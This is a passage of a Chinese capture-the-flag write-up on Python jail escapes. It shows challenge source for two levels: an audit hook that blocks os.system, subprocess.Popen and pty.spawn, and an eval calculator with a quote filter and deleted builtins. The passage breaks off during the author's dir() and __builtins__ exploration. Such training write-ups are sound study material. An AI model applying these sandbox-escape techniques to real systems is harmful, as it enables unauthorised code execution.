    <span class="token keyword">del</span> __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>m<span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">my_audit_hook</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> _<span class="token punctuation">)</span><span class="token punctuation">:</span>
    BALCKED_EVENTS <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'pty.spawn'</span><span class="token punctuation">,</span> <span class="token string">'os.system'</span><span class="token punctuation">,</span> <span class="token string">'os.exec'</span><span class="token punctuation">,</span> <span class="token string">'os.posix_spawn'</span><span class="token punctuation">,</span><span class="token string">'os.spawn'</span><span class="token punctuation">,</span><span class="token string">'subprocess.Popen'</span><span class="token punctuation">,</span><span class="token string">'code.__new__'</span><span class="token punctuation">,</span><span class="token string">'function.__new__'</span><span class="token punctuation">,</span><span class="token string">'cpython._PySys_ClearAuditHooks'</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> event <span class="token keyword">in</span> BALCKED_EVENTS<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'Operation banned: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">guesser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    game_score <span class="token operator">=</span> <span class="token number">0</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Can u guess the number? between 1 and 9999999999999 > '</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    right_guesser_question_answer <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9999999999999</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span> challenge_original_stdout <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>stdout

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        input_data <span class="token operator">=</span> eval_func<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> challenge_original_stdout
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Seems not right! please guess it!"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> game_score
    sys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> challenge_original_stdout

    <span class="token keyword">if</span> input_data <span class="token operator">==</span> right_guesser_question_answer<span class="token punctuation">:</span>
        game_score <span class="token operator">+=</span> <span class="token number">1</span>
    
    <span class="token keyword">return</span> game_score

WELCOME<span class="token operator">=</span><span class="token triple-quoted-string string">'''
  _       _    ____    _       _    ____    _       _    ____  
 | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ 
 | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |
 | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt; 
 | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |
 |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ 
                                                                                                                                                                       
'''</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Welcome to my guesser game!'</span><span class="token punctuation">)</span>
    game_score <span class="token operator">=</span> guesser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> game_score <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'you are really super guesser!!!!'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;fake_flag_in_local_but_really_in_The_remote&#125;'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Guess game end!!!'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span>my_audit_hook<span class="token punctuation">)</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和上题一样禁了各种RCE，但是恢复随机数的方法不依赖RCE，所以上题的payload还能用</p>
<hr>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2990">level 4</a></h2><blockquote>
<p>绕过引号过滤</p>
</blockquote>
<p>题目源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#No danger function,no chr,Try to hack me!!!!</span>
<span class="token comment">#Try to read file ./flag</span>


BANLIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__loader__'</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">]</span>

eval_func <span class="token operator">=</span> <span class="token builtin">eval</span>

<span class="token keyword">for</span> m <span class="token keyword">in</span> BANLIST<span class="token punctuation">:</span>
    <span class="token keyword">del</span> __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>m<span class="token punctuation">]</span>

<span class="token keyword">del</span> __loader__<span class="token punctuation">,</span> __builtins__

<span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    not_allowed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'"\'`'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> not_allowed <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">)</span>

WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
  _                _                           _       _ _   _                _ _  _   
 | |              (_)                         (_)     (_) | | |              | | || |  
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ 
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  
              __/ |                          _/ |                                      
             |___/                          |__/                                                                                                                                             
'''</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the python jail"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Let's have an beginner jail of calc"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>eval_func<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>禁用了 <code>__loader__</code>, <code>__import__</code>, <code>compile</code>, <code>eval</code>, <code>exec</code>, <code>chr</code>，还禁用了 <code>&#39;</code>、<code>&quot;</code>、<code>\</code> 和反引号，删掉了 <code>__loader__</code> 和 <code>__builtins__</code></p>
<p>先用<code>dir()</code>看看有啥东西</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
Answer<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'BANLIST'</span><span class="token punctuation">,</span> <span class="token string">'WELCOME'</span><span class="token punctuation">,</span> <span class="token string">'__annotations__'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'__cached__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">,</span> <span class="token string">'eval_func'</span><span class="token punctuation">,</span> <span class="token string">'filter'</span><span class="token punctuation">,</span> <span class="token string">'input_data'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>发现 <code>__builtins__</code> 还在，那看看里面有啥</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span> __builtins__
Answer<span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'__name__'</span><span class="token punctuation">:</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token string">"Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">:</span> ModuleSpec<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> loader<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> origin<span class="token operator">=</span><span class="token string">'built-in'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'__build_class__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function __build_class__<span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'abs'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">abs</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'all'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">all</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'any'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">any</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">ascii</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'bin'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">bin</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'breakpoint'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function breakpoint<span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'callable'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">callable</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'delattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">delattr</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">dir</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'divmod'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">divmod</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">format</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">getattr</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">globals</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'hasattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">hasattr</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'hash'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">hash</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'hex'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">hex</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">id</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">input</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'isinstance'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">isinstance</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'issubclass'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">issubclass</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'iter'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">iter</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'aiter'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function aiter<span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'len'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">len</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'locals'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">locals</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">max</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">min</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'next'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">next</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'anext'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function anext<span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'oct'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">oct</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">ord</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">pow</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token keyword">print</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'repr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">repr</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">round</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">setattr</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'sorted'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">sorted</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'sum'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">sum</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'vars'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">vars</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'Ellipsis'</span><span class="token punctuation">:</span> Ellipsis<span class="token punctuation">,</span> <span class="token string">'NotImplemented'</span><span class="token punctuation">:</span> NotImplemented<span class="token punctuation">,</span> <span class="token string">'False'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'True'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'bool'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bool'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'memoryview'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'bytearray'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'bytes'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'classmethod'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'complex'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'dict'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'enumerate'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'filter'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'filter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'float'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'frozenset'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'property'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'int'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'list'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'map'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'map'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'object'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'range'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'reversed'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'set'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'slice'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'staticmethod'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'str'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'super'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'tuple'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'zip'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__debug__'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'BaseException'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'Exception'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Exception'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'TypeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TypeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'StopAsyncIteration'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'StopAsyncIteration'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'StopIteration'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'StopIteration'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'GeneratorExit'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'GeneratorExit'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'SystemExit'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SystemExit'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'KeyboardInterrupt'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'KeyboardInterrupt'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ImportError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ImportError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ModuleNotFoundError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ModuleNotFoundError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'OSError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'EnvironmentError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'IOError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'EOFError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'EOFError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'RuntimeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RuntimeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'RecursionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RecursionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'NotImplementedError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotImplementedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'NameError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NameError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'UnboundLocalError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnboundLocalError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'AttributeError'</span><span class="token 